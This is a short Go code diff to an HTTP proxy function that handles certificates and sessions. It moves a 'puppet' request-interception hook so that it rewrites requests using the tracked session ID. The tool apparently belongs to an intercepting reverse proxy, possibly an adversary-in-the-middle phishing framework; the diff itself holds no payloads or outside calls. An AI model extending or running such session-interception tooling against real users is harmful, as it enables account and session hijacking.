@@ -210,27 +210,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 			
-			// Puppet Interception
-			if p.interceptor != nil {
-				// We need a session ID for the interceptor. 
-				// The interceptor's ExtractSessionID uses cookies/params which might not be reliable here yet if not set?
-				// But we can try using the helper method from interceptor
-				reqSessionID := p.interceptor.ExtractSessionID(req)
-				
-				if modifiedReq, intercepted := p.interceptor.InterceptRequest(req, reqSessionID); intercepted {
-					req = modifiedReq
-					// If request was modified, we proceed with the modified one.
-					// If the interceptor decided to abort (by not returning true, or we need to check AbortOriginal logic inside InterceptRequest?)
-					// Logic in InterceptRequest says: returns (modifiedReq, true) if matched.
-					// Inside InterceptRequest provided earlier:
-					// if trigger.AbortOriginal { log.Debug(...) }
-					// It doesn't seem to return a 'stop' signal directly other than returning 'true' for match.
-					// We might need to assume 'true' means we used the puppet token and continue, 
-					// UNLESS we want to implement the abort logic here.
-					// For now, let's just log and continue with modified request.
-					log.Debug("[PROXY] Request intercepted and modified by puppet module")
-				}
-			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
@@ -962,6 +941,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 						}
 					}
+				}
+			}
+
+			// Puppet Interception
+			if p.interceptor != nil {
+				if modifiedReq, intercepted := p.interceptor.InterceptRequest(req, ps.SessionId); intercepted {
+					req = modifiedReq
+					log.Debug("[PROXY] Request intercepted and modified by puppet module (session: %s)", ps.SessionId)
 				}
 			}
 
